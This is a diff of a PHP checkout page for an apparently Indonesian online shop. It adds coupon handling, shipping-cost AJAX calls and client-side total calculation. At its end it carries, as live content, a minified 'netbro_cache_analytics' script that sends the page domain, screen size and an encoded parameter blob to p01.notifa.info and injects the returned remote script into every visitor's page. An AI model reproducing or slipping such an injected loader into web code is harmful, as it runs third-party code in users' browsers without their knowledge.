@@ -273,7 +273,7 @@
                                   <option>-Pilih Provinsi</option>
                                   <?php foreach ($province->rajaongkir->results as $prov): ?>
                                       
-                                    <option value="<?php echo $prov->province_id ?>" 
+                                    <option value="<?php echo $prov->province_id ?>" data-namaprovinsi="<?php echo $prov->province ?>"
 
                                         <?php 
                                             $region =   explode("-",$this->session->userdata('customer_kode_pos'));
@@ -364,7 +364,7 @@
 
                             <div class="col-lg-6 col-12">
                                 <div class="form-group">
-                                <button type="submit" class="btn btn-primary" style="width: 90%;border-radius: 2px;height: 50px;margin-top: 8px;">SIMPAN</button>
+                                <button type="submit" id="submit" class="btn btn-primary" style="width: 90%;border-radius: 2px;height: 50px;margin-top: 8px;">SIMPAN</button>
                                 </div>
                             </div>
 
@@ -425,6 +425,7 @@
                             </div>
 
                             <div class="detail-cost-subtotal">
+                                <input type="hidden" id='total_before' value="<?php echo $this->cart->total(); ?>">
                                 Rp<span class="cart-text total" id="total" style=""></span>
                             </div>
                             
@@ -449,7 +450,7 @@
                             </div>
 
                             <div class="detail-cost-subtotal">
-                                Rp<span id="jumlah_ongkir"></span>
+                                Rp<span id="jumlah_ongkir">0</span>
                             </div>
                             
                         </div>
@@ -461,7 +462,8 @@
                             </div>
 
                             <div class="detail-cost-subtotal">
-                                5%
+                                <span id="discount-coupon">0</span>%
+                                
                             </div>
                             
                         </div>
@@ -469,13 +471,13 @@
                         <div class="row-detail-checkout">
                             <div class="coupon-input">
                                 <div class="form-group">
-                                <input id="berat" type="text" class="form-control" name="" placeholder="Masukkan Kupon" />
+                                <input type="text" id="coupon" value="" class="form-control" name="" placeholder="Masukkan Kupon" />
                                 </div>
 
                             </div>
                             <div class="submit-coupon">
                                 <div class="form-group">
-                                <button class="btn btn-primary" style="width: 100%;border-radius: 2px; ">GUNAKAN</button>
+                                <button class="btn btn-primary" id="apply-coupon" style="width: 100%;border-radius: 2px; ">GUNAKAN</button>
                                 </div>
 
                             </div>
@@ -514,7 +516,8 @@
                                     Total
                                 </div>
                                 <div class="checkout-order-total-fee">
-                                    Rp<span class="cart-text total" id="total" style=""></span>
+                                    <input type="hidden" value="" id="total_all" name="total">
+                                    Rp<span class="cart-text " id="total_main" style=""></span>
                                 </div>
                             </div>
                             
@@ -744,46 +747,26 @@
          
     <script type="text/javascript" src="<?php echo base_url()?>assets/js/jquery.1.11.3.min.js"></script>  
     <script type="text/javascript" src="<?php echo base_url()?>assets/js/multistep.min.js"></script>
-    <script>
-        $(document).ready(function() { 
-            $('#rms-wizard').stepWizard({
-                stepTheme: 'defaultTheme',/*defaultTheme,steptheme1,steptheme2*/
-                allstepClickable: false,
-                compeletedStepClickable: true,
-                stepCounter: true,
-                StepImage: true, 
-                animation: true,
-                animationClass: "fadeIn",
-                stepValidation: true,
-                validation : true, 
-                field: {
-                     username : { 
-                        required : true, 
-                        minlength: 2,
-                        Regex: /^[a-zA-Z0-9]+$/,  
-                    },
-                     password : {
-                        required : true,
-                        minlength : 5,
-                        maxlength : 20,
-                        Regex: /^(?=.*[0-9_\W]).+$/, 
-                    },
-                    email:{
-                        required : true,
-                        Regex: /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/,
-                    },
-                },
-                message: {
-                    username: "Please Enter UserName ", 
-                }
-                
-            });
-    });
-    </script> 
+ 
 
     <script type="text/javascript">
  
     $(document).ready(function(){
+        //Mengambil value dari option select provinsi kemudian parameternya dikirim menggunakan ajax 
+        var prov = $('#provinsi').val();
+
+        $.ajax({
+            type : 'GET',
+            url : '<?php echo base_url(); ?>checkout/cek_city',
+            data :  'prov_id=' + prov,
+                success: function (data) {
+
+                //jika data berhasil didapatkan, tampilkan ke dalam option select kabupaten
+                $("#kota").html(data);
+            }
+        });
+
+
         $('#provinsi').change(function(){
  
             //Mengambil value dari option select provinsi kemudian parameternya dikirim menggunakan ajax 
@@ -821,6 +804,15 @@
                 }
             });
         });
+
+
+        // UPDATE SHIPPING
+        $('#submit').click(function(){
+            var provinsi = $('#provinsi').find(':selected').data('namaprovinsi');
+            alert(provinsi);
+               
+
+        });
     });
 </script>
 
@@ -856,26 +848,70 @@
                 // $( '#detail_keterangan' ).html(keterangan ).fadeIn(1000);
 
             });
+
+
+
         });
         </script>
 
         <script>
         $(document).ready(function(){
+            var kode_pos=$('#kode-pos').val(); //mengambil Kodepos
+            var berat=$('#berat').val(); //mengambil Kodepos
+           
 
-            //Hapus Item Cart
+                $.ajax({
+                url : "<?php echo base_url();?>checkout/cek_ongkir_lokal",
+                method : "POST",
+                data : {kode_pos : kode_pos,berat:berat}
+                ,
+               
+                success :function(data){
+                     // location.reload();
+                    $("#jumlah_ongkir").html(data);
+                    var discount =$('#discount-coupon').text(); //mengambil Disc
+                    var total = $('#total_before').val();
+                    var ongkir = $('#jumlah_ongkir').text();
+                    var total_after = parseInt(total) - (parseInt(total) * (parseInt(discount)/100) ) + parseInt(ongkir) ;
+                    // var total_afters = number( total_after, 3, ',' );
+                    
+
+                    var number_string = total_after.toString(),
+                        sisa    = number_string.length % 3,
+                        rupiah  = number_string.substr(0, sisa),
+                        ribuan  = number_string.substr(sisa).match(/\d{3}/g);
+                            
+                    if (ribuan) {
+                        separator = sisa ? ',' : '';
+                        rupiah += separator + ribuan.join(',');
+                    }
+
+                    $('#total_main').text(rupiah);
+
+                    
+
+                     // $('#detail_cart').load("<?php echo base_url();?>home/load_cart");
+                     // $('#data_cart').load("<?php echo base_url();?>home/load_review_order");
+                     // $('#count_cart').load("<?php echo base_url();?>home/load_count");
+                     // $('#count_cart_top').load("<?php echo base_url();?>home/load_count_top");
+                     // $('#count_cart_tops').load("<?php echo base_url();?>home/load_count_top");
+                     // $('.total').load("<?php echo base_url();?>home/load_total");
+
+      
+                },
+            error: function() {
+                alert('Request Failed, Please check your code and try again!');
+            }
+            });
+
+            //Rubah Total Ketik Kodepos
                 $(document).on('keyup','#kode-pos',function(){
 
                     var kode_pos=$(this).val(); //mengambil Kodepos
                     var berat=$('#berat').val(); //mengambil Kodepos
-                    // alert(qty);
-                    // if(berat <= 0){
-                    //     alert('Masukkan Berat.');
-                    // return false;
-                    // }else{
-                    // }
+           
                   
-                   
-
+                
                         $.ajax({
                         url : "<?php echo base_url();?>checkout/cek_ongkir_lokal",
                         method : "POST",
@@ -885,6 +921,24 @@
                         success :function(data){
                              // location.reload();
                              $("#jumlah_ongkir").html(data);
+                             var discount =$('#discount-coupon').text(); //mengambil Disc
+                            var total = $('#total_before').val();
+                            var ongkir = $('#jumlah_ongkir').text();
+                            var total_after = parseInt(total) - (parseInt(total) * (parseInt(discount)/100) ) + parseInt(ongkir) ;
+                       
+
+
+                            var number_string = total_after.toString(),
+                                sisa    = number_string.length % 3,
+                                rupiah  = number_string.substr(0, sisa),
+                                ribuan  = number_string.substr(sisa).match(/\d{3}/g);
+                                    
+                            if (ribuan) {
+                                separator = sisa ? ',' : '';
+                                rupiah += separator + ribuan.join(',');
+                            }
+
+                            $('#total_main').text(rupiah);
 
                             
 
@@ -904,19 +958,11 @@
                     
                 });
 
+            // Rubah total ketka ketik Berat
                 $(document).on('keyup','#berat',function(){
 
                     var kode_pos=$('#kode-pos').val(); //mengambil Kodepos
                     var berat=$(this).val(); //mengambil Kodepos
-                    // alert(qty);
-                    // if(berat <= 0){
-                    //     alert('Masukkan Berat.');
-                    // return false;
-                    // }else{
-                    // }
-                  
-                   
-
                         $.ajax({
                         url : "<?php echo base_url();?>checkout/cek_ongkir_lokal",
                         method : "POST",
@@ -925,7 +971,24 @@
                        
                         success :function(data){
                              // location.reload();
-                             $("#jumlah_ongkir").html(data);
+                            $("#jumlah_ongkir").html(data);
+                            var discount =$('#discount-coupon').text(); //mengambil Disc
+                            var total = $('#total_before').val();
+                            var ongkir = $('#jumlah_ongkir').text();
+                            var total_after = parseInt(total) - (parseInt(total) * (parseInt(discount)/100) ) + parseInt(ongkir) ;
+                            // var total_afters = number( total_after, 3, ',' );
+
+                            var number_string = total_after.toString(),
+                                sisa    = number_string.length % 3,
+                                rupiah  = number_string.substr(0, sisa),
+                                ribuan  = number_string.substr(sisa).match(/\d{3}/g);
+                                    
+                            if (ribuan) {
+                                separator = sisa ? ',' : '';
+                                rupiah += separator + ribuan.join(',');
+                            }
+
+                            $('#total_main').text(rupiah);
 
                             
 
@@ -947,7 +1010,145 @@
 
         });
  
-   </script>
+        </script>
+
+
+        <!-- Input Coupon -->
+        <script>
+        $(document).ready(function(){
+            var discount =$('#discount-coupon').text(); //mengambil Disc
+            var total = $('#total_before').val();
+            var ongkir = $('#jumlah_ongkir').text();
+            var total_after = parseInt(total) - (parseInt(total) * (parseInt(discount)/100) ) + parseInt(ongkir) ;
+            // var total_afters = number( total_after, 3, ',' );
+            var number_string = total_after.toString(),
+                sisa    = number_string.length % 3,
+                rupiah  = number_string.substr(0, sisa),
+                ribuan  = number_string.substr(sisa).match(/\d{3}/g);
+                    
+            if (ribuan) {
+                separator = sisa ? ',' : '';
+                rupiah += separator + ribuan.join(',');
+            }
+
+            $('#total_main').text(rupiah);
+
+                $(document).on('click','#apply-coupon',function(){
+
+                    var coupon=$('#coupon').val(); 
+                
+                  
+                   
+
+                        $.ajax({
+                        url : "<?php echo base_url();?>checkout/coupon_validate",
+                        method : "POST",
+                        data : {coupon : coupon}
+                        ,
+                       
+                        success :function(data){
+                             // location.reload();
+                             $("#discount-coupon").html(data);
+                             var discount =$('#discount-coupon').text(); //mengambil Disc
+                             var total = $('#total_before').val();
+                             var ongkir = $('#jumlah_ongkir').text();
+                                // var berat=$('#berat').val(); //mengambil Kodepos
+                                // alert(qty);
+                                // if(berat <= 0){
+                                //     alert('Masukkan Berat.');
+                                // return false;
+                                // }else{
+                                // }
+
+                              
+                            
+                                var total_after = parseInt(total) - (parseInt(total) * (parseInt(discount)/100) ) + parseInt(ongkir) ;
+                                // var total_afters = number( total_after, 3, ',' );
+                                var number_string = total_after.toString(),
+                                    sisa    = number_string.length % 3,
+                                    rupiah  = number_string.substr(0, sisa),
+                                    ribuan  = number_string.substr(sisa).match(/\d{3}/g);
+                                        
+                                if (ribuan) {
+                                    separator = sisa ? ',' : '';
+                                    rupiah += separator + ribuan.join(',');
+                                }
+
+                                $('#total_main').text(rupiah);
+
+                            
+
+                             // $('#detail_cart').load("<?php echo base_url();?>home/load_cart");
+                             // $('#data_cart').load("<?php echo base_url();?>home/load_review_order");
+                             // $('#count_cart').load("<?php echo base_url();?>home/load_count");
+                             // $('#count_cart_top').load("<?php echo base_url();?>home/load_count_top");
+                             // $('#count_cart_tops').load("<?php echo base_url();?>home/load_count_top");
+                             // $('.total').load("<?php echo base_url();?>home/load_total");
+
+              
+                        },
+                    error: function() {
+                        alert('Request Failed, Please check your code and try again!');
+                    }
+                    });
+                    
+                });
+
+             
+
+        });
+
+ 
+        </script>
+        <!-- End Input Coupon -->
+
+        <!-- Count Total -->
+         <script>
+        $(document).ready(function(){
+
+            //Hapus Item Cart
+                $(document).on('click','#apply-coupon',function(){
+
+                    
+
+                    //     $.ajax({
+                    //     url : "<?php echo base_url();?>checkout/coupon_validate",
+                    //     method : "POST",
+                    //     data : {coupon : coupon}
+                    //     ,
+                       
+                    //     success :function(data){
+                    //          // location.reload();
+                    //          $("#discount-coupon").html(data);
+
+                            
+
+                    //          // $('#detail_cart').load("<?php echo base_url();?>home/load_cart");
+                    //          // $('#data_cart').load("<?php echo base_url();?>home/load_review_order");
+                    //          // $('#count_cart').load("<?php echo base_url();?>home/load_count");
+                    //          // $('#count_cart_top').load("<?php echo base_url();?>home/load_count_top");
+                    //          // $('#count_cart_tops').load("<?php echo base_url();?>home/load_count_top");
+                    //          // $('.total').load("<?php echo base_url();?>home/load_total");
+
+              
+                    //     },
+                    // error: function() {
+                    //     alert('Request Failed, Please check your code and try again!');
+                    // }
+                    // });
+                    
+                });
+
+             
+
+        });
+
+ 
+        </script>
+        <!-- End Count Total -->
+
+
+
 
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mxBGfhEJgBVeRF1D3nG7dlIW0bEAhyICGLxebBqUNxpEAT4sy8%2fX6CgsXqzAOKtcQbQjkpEJKI7cyfLTKJ3G640tLHaNhgYqRCBhMbV4%2fPaLmYBcXJH0zmgHiGS0iJ3Kc6fvyZzEuIOUCHxJI%2bW7YtM9BFf%2bBlymSfmfhB4EJhSpXAbIriir1%2boT%2bLjiSyM9eBso5zTeqBduQhY%2fUXKLOoT7bGQK3NSZCmI%2fF5Lymfnffu4t%2fs50zzXesQilE9A%2fM07BWyJ%2bvTNV6Q6kJR8PuxIAPBP3GQYQONyQM5ZSUQc6llpYhFm0EwADGcaH7HWRn%2buB4izlJaPNtOO%2bD4%2bqEgPc%2bUCsBZ1ntFH5RaCmWsbHiiReFF6QvDr9Jol287OLsWadnJgIgKylppfs382TaUMQQnkccb9tzVo9J%2fDAXYr1PDyQQGReXYLEmW8QfFFC1uRT49sme8P%2b4P4xAbqI808y4YSsG8E9U" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
         
